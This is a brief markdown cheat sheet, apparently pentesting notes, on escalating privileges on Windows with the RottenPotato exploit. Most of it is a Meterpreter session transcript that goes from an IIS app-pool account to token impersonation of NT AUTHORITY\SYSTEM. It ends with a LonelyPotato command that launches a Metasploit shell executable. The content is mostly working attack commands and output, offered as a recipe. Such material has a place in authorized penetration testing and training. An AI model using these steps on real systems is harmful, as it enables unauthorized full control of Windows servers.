# Rottenpotato priv escalation

This escalate to NT AUTHORITY_SYSTEM if you have impersonate_token 
meterpreter sessions is required.

```sh
meterpreter > getuid                           
Server username: IIS APPPOOL\DefaultAppPool                                   
meterpreter > getprivs                    

meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

             Delegation Tokens Available
             ========================================
             IIS APPPOOL\DefaultAppPool

             Impersonation Tokens Available
             ========================================
             NT AUTHORITY\IUSR

meterpreter > execute -cH -f ./rottenpotato.exe

Process 1068 created.                                                                                                                                                                                                                               
Channel 2 created.                                                                                                                                                                                                                                  
meterpreter > list_tokens -u                                                                                                                                                                                                                        
[-] Warning: Not currently running as SYSTEM, not all tokens will be available                                                                                                                                                                      
             Call rev2self if primary process token is SYSTEM                                                                                                                                                                                       

             Delegation Tokens Available
             ========================================
             IIS APPPOOL\DefaultAppPool

             Impersonation Tokens Available
             ========================================
             NT AUTHORITY\IUSR
             NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
             [-] No delegation token available
             [+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Lonelypotato 

```sh
c:\Users\Sarah\lonelypotato.exe * msfshell.exe
```

